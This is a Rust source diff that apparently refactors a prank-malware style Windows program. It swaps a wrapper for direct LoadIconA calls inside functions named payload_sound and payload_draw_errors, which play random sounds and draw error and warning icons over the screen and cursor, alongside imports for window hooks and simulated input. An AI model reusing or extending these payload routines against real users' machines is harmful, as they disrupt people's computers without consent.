@@ -15,13 +15,13 @@ use crate::utils::log::*;
 use windows::Win32::Foundation::GetLastError;
 
 use crate::{
-    convert_str::ToPCSTRWrapper,
+    convert_str::ToPCSTR,
     data::{
         msg::{n_sounds, SOUNDS},
         sites::{N_SITES, SITES},
     },
     wrap_windows_api::{
-        wrap_get_current_thread_id, wrap_get_system_metrics, wrap_load_icon_a, wrap_messagebox_a,
+        wrap_get_current_thread_id, wrap_get_system_metrics, wrap_messagebox_a,
         wrap_set_windows_hook_ex_a, wrap_shell_execute_w, wrap_unhook_windows_hook_ex, WinError,
     },
 };
@@ -37,8 +37,8 @@ use windows::{
             Input::KeyboardAndMouse::{SendInput, INPUT, INPUT_KEYBOARD, VIRTUAL_KEY},
             WindowsAndMessaging::{
                 DrawIcon, EnumChildWindows, GetCursorPos, GetDesktopWindow, GetWindowRect,
-                SetCursorPos, MB_ICONWARNING, MB_OK, MB_SYSTEMMODAL, SM_CXICON, SM_CXSCREEN,
-                SM_CYICON, SM_CYSCREEN, SW_SHOWDEFAULT, WH_CBT,
+                LoadIconA, SetCursorPos, MB_ICONWARNING, MB_OK, MB_SYSTEMMODAL, SM_CXICON,
+                SM_CXSCREEN, SM_CYICON, SM_CYSCREEN, SW_SHOWDEFAULT, WH_CBT,
             },
         },
     },
@@ -214,7 +214,7 @@ fn payload_sound(_times: i32, _runtime: i32) -> i32 {
         };
 
         match PlaySoundA(
-            *SOUNDS[rand::random::<usize>() % n_sounds()].to_pcstr(),
+            SOUNDS[rand::random::<usize>() % n_sounds()].to_pcstr(),
             hmod.unwrap(),
             SND_ASYNC,
         )
@@ -307,7 +307,7 @@ fn payload_draw_errors(times: i32, _runtime: i32) -> i32 {
         let mut cursor: POINT = Default::default();
         GetCursorPos(&mut cursor);
 
-        let load_icon = wrap_load_icon_a(HMODULE(0), "IDI_ERROR").unwrap_or_default();
+        let load_icon = LoadIconA(HMODULE(0), "IDI_ERROR".to_pcstr()).unwrap_or_default();
 
         DrawIcon(hdc, cursor.x - ix, cursor.y - iy, load_icon);
 
@@ -316,7 +316,7 @@ fn payload_draw_errors(times: i32, _runtime: i32) -> i32 {
                 hdc,
                 rand::random::<i32>() % scrw,
                 rand::random::<i32>() % scrh,
-                wrap_load_icon_a(HMODULE(0), "IDI_WARNING").unwrap_or_default(),
+                LoadIconA(HMODULE(0), "IDI_WARNING".to_pcstr()).unwrap_or_default(),
             );
         }
         if ReleaseDC(hwnd, hdc) == 0 {
